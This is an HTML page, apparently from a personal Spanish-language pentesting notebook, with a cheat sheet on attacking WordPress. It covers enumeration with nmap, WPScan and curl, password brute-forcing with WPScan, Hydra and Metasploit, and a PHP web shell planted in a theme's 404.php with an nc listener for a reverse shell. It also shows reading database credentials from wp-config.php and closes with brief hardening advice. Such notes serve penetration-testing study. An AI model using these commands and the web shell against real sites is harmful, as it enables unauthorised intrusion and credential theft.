@@ -1,0 +1,281 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>WordPress | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="wordpress">
+          <div class="note-tabbar">
+            <span>WordPress</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Aplicaciones Web/CMS</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">aplicaciones web / cms / wordpress</p>
+            <h2>WordPress</h2>
+
+            <h2>Enumeración</h2>
+
+            <section class="code-card">
+              <h3>Nmap</h3>
+              <pre><code># Enumeración básica
+nmap -sV --script http-wordpress-enum &lt;url&gt;
+
+# Escaneo de vulnerabilidades
+nmap --script=http-vuln* -p 80,443 &lt;url&gt;
+nmap -sV --script &quot;http-wordpress* and not http-wordpress-brute&quot; &lt;url&gt;
+
+# Enumeración de usuarios
+nmap -sV --script http-wordpress-users &lt;url&gt;
+
+# Escaneo de plugins en la ruta http://ip/wordpress
+nmap -p80 --script http-wordpress-enum --script-args http-wordpress-enum.root=&#x27;/wordpress&#x27;,search-limit=1000 &lt;ip_target&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Fuzzing</h3>
+              <pre><code>gobuster dir -u http://url/ -w &lt;wp-plugins.fuzz.txt&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>URLs de interés</h3>
+              <pre><code># Login
+url/wp-admin
+url/wp-admin/login.php
+url/wp-admin/wp-login.php
+url/wp-login.php
+
+# Plugins
+url/wp-content/
+url/wp-content/plugins/
+url/wp-content/uploads/
+
+# Interés
+url/xmlrpc.php
+url/robots.txt
+url/sitemap.xml
+url/CHANGELOG.txt</code></pre>
+            </section>
+
+            <h2>Explotar acceso a WordPress</h2>
+
+            <p>Con credenciales administrativas se puede editar el código PHP de un tema. Ruta típica: <code>Appearance</code> → <code>Theme Editor</code> → seleccionar tema → editar <code>404.php</code>.</p>
+
+            <section class="code-card">
+              <h3>RCE en 404.php</h3>
+              <pre><code>&lt;?php
+system($_GET[&#x27;cmd&#x27;]);
+&lt;DATA&gt;
+?&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Ejecutar RCE</h3>
+              <pre><code>curl &quot;http://&lt;target&gt;/wp-content/themes/twentyseventeen/404.php?cmd=id&quot;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Reverse shell en 404.php</h3>
+              <pre><code>&lt;?php
+pentest_monkey_php_rev_shell
+&lt;DATA&gt;
+?&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Listener</h3>
+              <pre><code># Ejecutar una URL que genere un 404 para cargar el template 404.php
+nc -nlvp 443</code></pre>
+            </section>
+
+            <h2>Post-explotación: configuración de base de datos</h2>
+
+            <section class="code-card">
+              <h3>wp-config.php</h3>
+              <pre><code>cat wp-config.php | grep &#x27;DB_USER|DB_PASSWORD&#x27;</code></pre>
+            </section>
+
+            <h2>WPScan</h2>
+
+            <section class="code-card">
+              <h3>WPScan</h3>
+              <pre><code># Enumeración básica
+wpscan --url &lt;url_wordpress&gt;
+
+# Enumeración de usuarios
+wpscan --url &lt;url_wordpress&gt; -e u
+wpscan --url &lt;url_wordpress&gt; -U &lt;user&gt; -P /usr/share/wordlists/rockyou.txt
+wpscan --url &lt;url_wordpress&gt; -e u --passwords /usr/share/wordlists/rockyou.txt
+
+# Enumeración de plugins vulnerables y usuarios
+wpscan --url &lt;url_wordpress&gt; -e vp,u
+wpscan --url &lt;url_wordpress&gt; -e vp,u --plugins-detection aggressive
+wpscan --url &lt;url_wordpress&gt; -e vp,u --plugins-detection aggressive --api-token=&lt;token&gt;
+wpscan --url &lt;url_wordpress&gt; -e vp,u --plugins-detection mixed --api-token=&lt;token&gt;
+
+# Plugins, complementos y temas
+wpscan --url &lt;url_wordpress&gt; -e p
+wpscan --url &lt;url&gt; -e ap
+wpscan --url &lt;url&gt; -e t
+
+# Bypass de bloqueos
+wpscan -u &lt;url_wordpress&gt; --username &lt;user&gt; -w /usr/share/wordlists/rockyou.txt --random-agent</code></pre>
+            </section>
+
+            <p>El API token de WPVulnDB permite superar límites de consultas diarias en WPScan.</p>
+
+            <section class="code-card">
+              <h3>Directorio wp-content personalizado</h3>
+              <pre><code>wpscan -u &lt;url_wordpress&gt; --wp-content-dir &quot;directorio-personalizado-wordpress&quot;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Curl</h3>
+              <pre><code># Versión WordPress
+curl -s &lt;url&gt; | grep WordPress
+curl -s &lt;url&gt; | grep &#x27;&lt;meta name=&quot;generator&quot;&#x27;
+
+# Enumeración de usuarios
+curl http://&lt;url&gt;/wp-json/wp/v2/users | jq # Versiones &lt; 4.7.1
+
+# Enumeración de plugins
+curl -s &lt;url&gt; | grep plugins
+curl -s &lt;url&gt; | sed &#x27;s/href=/
+/g&#x27; | sed &#x27;s/src=/
+/g&#x27; | grep &#x27;wp-content/plugins/*&#x27; | cut -d&quot;&#x27;&quot; -f2
+curl -s &lt;url&gt; | grep -oP &#x27;plugins/K.*&#x27; | sort -u
+
+# Enumeración de temas
+curl -s &lt;url&gt; | grep themes
+curl -s &lt;url&gt; | sed &#x27;s/href=/
+/g&#x27; | sed &#x27;s/src=/
+/g&#x27; | grep &#x27;themes&#x27; | cut -d&quot;&#x27;&quot; -f2</code></pre>
+            </section>
+
+            <h2>Fuerza bruta login</h2>
+
+            <p><code>wp-login</code> prueba contra el panel web. <code>xmlrpc</code> usa <code>/xmlrpc.php</code> y suele ser más cómodo si <code>wp.getUsersBlogs</code> está habilitado.</p>
+
+            <section class="code-card">
+              <h3>Comprobar XML-RPC</h3>
+              <pre><code># API activa
+curl &quot;http://&lt;target&gt;/xmlrpc.php&quot;
+
+# wp.getUsersBlogs activo
+curl -X POST &quot;http://&lt;target&gt;/xmlrpc.php&quot; -d@test.xml
+
+# test.xml
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;methodCall&gt;
+&lt;methodName&gt;system.listMethods&lt;/methodName&gt;
+&lt;params&gt;&lt;/params&gt;
+&lt;/methodCall&gt;</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>WPScan fuerza bruta</h3>
+              <pre><code>wpscan --url &lt;url/wp-login.php&gt; -U &lt;user&gt; -P &lt;pass.txt&gt; --password-attack xmlrpc -t 20
+wpscan --url &lt;url/wp-login.php&gt; -U &lt;users.txt&gt; -P &lt;pass.txt&gt;
+wpscan --url &lt;url/wp-login.php&gt; -U &lt;admin&gt;,&lt;david&gt; -P &lt;pass.txt&gt; --password-attack xmlrpc -t 20</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Hydra</h3>
+              <pre><code>hydra -L &lt;users.txt&gt; -P &lt;pass.txt&gt; &lt;url&gt; http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In:F=incorrect&quot;</code></pre>
+            </section>
+
+            <h2>Metasploit</h2>
+
+            <section class="code-card">
+              <h3>Módulos útiles</h3>
+              <pre><code># Escáner general
+use auxiliary/scanner/http/wordpress_scanner
+
+# Escaneo básico de WordPress
+use auxiliary/scanner/http/wordpress_version
+set RHOSTS &lt;url&gt;
+set RPORT 80
+set TARGETURI /
+run
+
+# Enumeración de usuarios
+use auxiliary/scanner/http/wordpress_users_enum
+set RHOSTS &lt;url&gt;
+set RPORT 80
+set TARGETURI /
+run
+
+# Ataque de fuerza bruta
+set RHOSTS &lt;url&gt;
+set USERNAME &lt;nombre_usuario&gt;
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+exploit</code></pre>
+            </section>
+
+            <h2>Hardening de WordPress</h2>
+
+            <div class="note-table-wrap">
+              <table class="note-table">
+                <thead><tr><th>Rol</th><th>Descripción</th></tr></thead>
+                <tbody>
+                  <tr><td>Administrador</td><td>Acceso a funciones administrativas, gestión de usuarios, publicaciones y código fuente.</td></tr>
+                  <tr><td>Editor</td><td>Puede publicar y administrar publicaciones, incluidas las de otros usuarios.</td></tr>
+                  <tr><td>Autor</td><td>Puede publicar y administrar sus propias publicaciones.</td></tr>
+                  <tr><td>Contribuyente</td><td>Puede escribir y administrar sus publicaciones, pero no publicarlas.</td></tr>
+                  <tr><td>Abonado</td><td>Usuario normal que puede explorar publicaciones y editar su perfil.</td></tr>
+                </tbody>
+              </table>
+            </div>
+
+            <section class="code-card">
+              <h3>Actualizaciones automáticas</h3>
+              <pre><code>define( &#x27;WP_AUTO_UPDATE_CORE&#x27;, true );
+add_filter( &#x27;auto_update_plugin&#x27;, &#x27;__return_true&#x27; );
+add_filter( &#x27;auto_update_theme&#x27;, &#x27;__return_true&#x27; );</code></pre>
+            </section>
+
+            <ul>
+              <li>Deshabilitar el usuario estándar <code>admin</code> y usar nombres menos predecibles.</li>
+              <li>Imponer contraseñas robustas y 2FA.</li>
+              <li>Aplicar mínimo privilegio en usuarios y revisar permisos periódicamente.</li>
+              <li>Limitar intentos de login y restringir <code>wp-login.php</code> por IP cuando sea posible.</li>
+              <li>Valorar plugins defensivos como Sucuri, iThemes Security o Wordfence.</li>
+            </ul>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>aplicaciones_web</span>
+              <span>cms</span>
+              <span>wordpress</span>
+              <span>wpscan</span>
+              <span>xmlrpc</span>
+              <span>hardening</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
